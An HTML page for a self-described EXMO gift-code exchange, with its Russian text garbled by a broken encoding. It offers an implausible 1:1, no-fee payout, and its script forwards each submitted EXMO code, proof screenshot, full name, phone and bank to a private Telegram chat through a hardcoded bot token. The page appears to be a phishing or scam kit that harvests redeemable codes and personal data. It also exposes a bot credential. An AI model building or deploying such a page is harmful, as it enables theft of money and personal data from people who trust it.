<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü—Ä–æ–¥–∞—Ç—å EXMO –∫–æ–¥ - EXMO –û–±–º–µ–Ω–Ω–∏–∫</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <video autoplay muted loop playsinline class="video-background">
        <source src="19264a464315513c06c2dc242649e340.mp4" type="video/mp4">
    </video>

    <header>
        <div class="user-bar">
            <div class="container">
                <div class="user-bar-content">
                    <div class="header-contacts-top">
                        <span>üì± –ü–æ–¥–¥–µ—Ä–∂–∫–∞: <a href="https://t.me/yourusername" target="_blank">@yourusername</a></span>
                        <span>üìß Email: support@example.com</span>
                    </div>
                    <div class="auth-buttons-header">
                        <button class="btn-login-header" onclick="window.location.href='login.html'">–í–æ–π—Ç–∏</button>
                        <button class="btn-register-header" onclick="window.location.href='register.html'">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="main-header">
            <div class="container">
                <div class="header-content">
                    <div class="logo">
                        <h1>EXMO –û–ë–ú–ï–ù–ù–ò–ö</h1>
                    </div>
                    <nav>
                        <a href="index.html">–ì–ª–∞–≤–Ω–∞—è</a>
                        <a href="#reviews">–û—Ç–∑—ã–≤—ã</a>
                        <a href="#howto">–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç</a>
                        <a href="#contacts">–ö–æ–Ω—Ç–∞–∫—Ç—ã</a>
                    </nav>
                    <div class="work-time">
                        <span>‚è∞ –†–∞–±–æ—Ç–∞–µ–º: 24 —á–∞—Å–∞ 7 –¥–Ω–µ–π –≤ –Ω–µ–¥–µ–ª—é</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <main>
        <section class="exchange-main-section">
            <div class="container">
                <div class="exchange-info">
                    <h2 id="pageTitle">–û–±–º–µ–Ω–Ω–∏–∫ EXMO –∫–æ–¥–æ–≤</h2>
                    <p class="exchange-conditions">–ö—É—Ä—Å –æ–±–º–µ–Ω–∞ 1√ó1 –±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏. –ë—ã—Å—Ç—Ä–∞—è –æ–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –°–ë–ü. –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –æ–±–º–µ–Ω–∞ ‚Äî 1 000 ‚ÇΩ, –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è ‚Äî 100 000 ‚ÇΩ. –í—Ä–µ–º—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∑–∞—è–≤–∫–∏: 10-30 –º–∏–Ω—É—Ç.</p>
                </div>

                <form id="sellForm" class="main-exchange-form">
                    <div class="exchange-columns">
                        <div class="exchange-column">
                            <div class="form-group">
                                <label>üí≥ Gift Card (EXMO –∫–æ–¥) *</label>
                                <input type="text" id="exmoCode" name="exmoCode" required
                                       placeholder="–í—Å—Ç–∞–≤—å—Ç–µ –∫–æ–¥, —Å–æ–∑–¥–∞–Ω–Ω—ã–π –≤ –ª–∏—á–Ω–æ–º –∫–∞–±–∏–Ω–µ—Ç–µ EXMO">
                                <small>min: 1 000 RUB | max: 100 000 RUB</small>
                            </div>

                            <div class="form-group">
                                <label>üí∞ –°—É–º–º–∞ *</label>
                                <input type="number" id="giveAmount" name="giveAmount" required
                                       placeholder="–£–∫–∞–∂–∏—Ç–µ —Å—É–º–º—É" min="1000" max="100000" step="1">
                                <small>min: 1 000 RUB | max: 100 000 RUB</small>
                            </div>

                            <div class="form-group">
                                <label>üìé –§–∞–π–ª –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è *</label>
                                <input type="file" id="screenshot" name="screenshot" required
                                       accept="image/*">
                                <small>–°–∫—Ä–∏–Ω—à–æ—Ç —Å –≤–∏–¥–∏–º—ã–º EXMO –∫–æ–¥–æ–º</small>
                            </div>
                        </div>

                        <div class="exchange-column">
                            <div class="form-group">
                                <label>üíµ –°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é</label>
                                <input type="number" id="receiveAmount" name="receiveAmount" readonly
                                       placeholder="0" class="amount-display">
                                <small>–ö—É—Ä—Å –æ–±–º–µ–Ω–∞ 1√ó1 ‚Ä¢ –û–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –°–ë–ü</small>
                            </div>

                            <div class="form-group">
                                <label>üë§ –§.–ò.–û. –ø–æ–ª—É—á–∞—Ç–µ–ª—è *</label>
                                <input type="text" id="fullName" name="fullName" required
                                       placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á">
                            </div>

                            <div class="form-group">
                                <label>üì± –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–°–ë–ü) *</label>
                                <input type="tel" id="phone" name="phone" required
                                       placeholder="+7 (___) ___-__-__">
                            </div>

                            <div class="form-group">
                                <label>üè¶ –ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞ *</label>
                                <input type="text" id="bank" name="bank" required
                                       placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –≤–∞—à–µ–≥–æ –±–∞–Ω–∫–∞">
                            </div>
                        </div>
                    </div>

                    <div class="form-agreement">
                        <label class="checkbox-label">
                            <input type="checkbox" required>
                            <span>–Ø —Å–æ–≥–ª–∞—Å–µ–Ω —Å <a href="terms.html" target="_blank" style="color: #007bff;">—É—Å–ª–æ–≤–∏—è–º–∏ –æ–±–º–µ–Ω–∞</a> –∏ <a href="privacy.html" target="_blank" style="color: #007bff;">–ø–æ–ª–∏—Ç–∏–∫–æ–π –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a></span>
                        </label>
                    </div>

                    <button type="submit" class="btn-submit-exchange">–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É</button>
                </form>

                <div id="successMessage" class="message success" style="display:none;">
                    ‚úì –ó–∞—è–≤–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –ú—ã —Å–≤—è–∂–µ–º—Å—è —Å –≤–∞–º–∏ –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.
                </div>
                <div id="errorMessage" class="message error" style="display:none;">
                    ‚úó –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –Ω–∞–º–∏ –≤ Telegram.
                </div>
            </div>
        </section>
    </main>

    <footer id="contacts">
        <div class="container">
            <div class="footer-content">
                <div class="footer-section">
                    <h3>–ö–æ–Ω—Ç–∞–∫—Ç—ã</h3>
                    <p>üì± Telegram: <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
                    <p>üìß Email: support@example.com</p>
                </div>
                <div class="footer-section">
                    <h3>–†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã</h3>
                    <p>24 —á–∞—Å–∞ 7 –¥–Ω–µ–π –≤ –Ω–µ–¥–µ–ª—é</p>
                    <p>–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞—è–≤–æ–∫: 10-30 –º–∏–Ω—É—Ç</p>
                </div>
                <div class="footer-section">
                    <h3>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h3>
                    <p>–ö—É—Ä—Å –æ–±–º–µ–Ω–∞: 1√ó1</p>
                    <p>–ö–æ–º–∏—Å—Å–∏—è: 0%</p>
                    <p>–°–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã: –°–ë–ü</p>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2026 –û–±–º–µ–Ω–Ω–∏–∫ EXMO –∫–æ–¥–æ–≤. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
            </div>
        </div>
    </footer>

    <script>
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞—Å—á—ë—Ç —Å—É–º–º—ã –ø–æ–ª—É—á–µ–Ω–∏—è (–∫—É—Ä—Å 1√ó1)
        const giveAmountInput = document.getElementById('giveAmount');
        const receiveAmountInput = document.getElementById('receiveAmount');

        giveAmountInput.addEventListener('input', function(e) {
            const amount = parseFloat(e.target.value) || 0;
            receiveAmountInput.value = amount;
        });

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function formatPhone(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (value[0] === '8') value = '7' + value.substring(1);
                if (value[0] !== '7') value = '7' + value;
            }
            let formatted = '+7';
            if (value.length > 1) formatted += ' (' + value.substring(1, 4);
            if (value.length >= 5) formatted += ') ' + value.substring(4, 7);
            if (value.length >= 8) formatted += '-' + value.substring(7, 9);
            if (value.length >= 10) formatted += '-' + value.substring(9, 11);
            e.target.value = formatted;
        }

        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', formatPhone);

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram —Å —Ñ–æ—Ç–æ
        async function sendToTelegram(order, screenshotFile) {
            const BOT_TOKEN = '8378403510:AAHdYIpQ2hRJ8H0va6kM-ZSfoYwVeosuQVA';
            const CHAT_ID = '7338817463';

            const caption =
                `üìã <b>–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ #${order.id}</b>\n\n` +
                `üí≥ <b>EXMO –∫–æ–¥:</b> <code>${order.exmoCode}</code>\n` +
                `üí∞ <b>–°—É–º–º–∞:</b> <code>${order.giveAmount} ‚ÇΩ</code>\n\n` +
                `üë§ <b>–ö–ª–∏–µ–Ω—Ç:</b>\n` +
                `‚Ä¢ –§–ò–û: <code>${order.fullName}</code>\n` +
                `‚Ä¢ üì± –¢–µ–ª–µ—Ñ–æ–Ω: <code>${order.phone}</code>\n` +
                `‚Ä¢ üè¶ –ë–∞–Ω–∫: <code>${order.bank}</code>\n\n` +
                `‚è∞ <code>${order.createdAt.substring(0, 19)}</code>`;

            if (screenshotFile) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å —Ñ–æ—Ç–æ
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', screenshotFile);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

                try {
                    await fetch(url, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {
                    console.log('Telegram photo error:', err);
                }
            } else {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: caption,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (err) {
                    console.log('Telegram error:', err);
                }
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã
        document.getElementById('sellForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            const giveAmount = parseFloat(document.getElementById('giveAmount').value);

            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';

            // –í–∞–ª–∏–¥–∞—Ü–∏—è –ª–∏–º–∏—Ç–æ–≤
            if (giveAmount < 1000 || giveAmount > 100000) {
                errorMessage.textContent = '‚úó –°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1 000 –¥–æ 100 000 —Ä—É–±–ª–µ–π.';
                errorMessage.style.display = 'block';
                return;
            }

            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞—è–≤–∫—É –≤ LocalStorage
            const orders = JSON.parse(localStorage.getItem('orders') || '[]');

            const newOrder = {
                id: orders.length + 1,
                type: 'sell',
                exmoCode: document.getElementById('exmoCode').value,
                giveAmount: giveAmount,
                receiveAmount: giveAmount,
                fullName: document.getElementById('fullName').value,
                phone: document.getElementById('phone').value,
                bank: document.getElementById('bank').value,
                status: 'pending',
                createdAt: new Date().toISOString()
            };

            orders.push(newOrder);
            localStorage.setItem('orders', JSON.stringify(orders));

            // –ü–æ–ª—É—á–∞–µ–º —Ñ–∞–π–ª —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
            const screenshotInput = document.getElementById('screenshot');
            const screenshotFile = screenshotInput.files[0] || null;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram —Å —Ñ–æ—Ç–æ
            sendToTelegram(newOrder, screenshotFile);

            successMessage.style.display = 'block';
            this.reset();
            receiveAmountInput.value = '0';

            setTimeout(() => {
                successMessage.style.display = 'none';
            }, 5000);
        });
    </script>
</body>
</html>
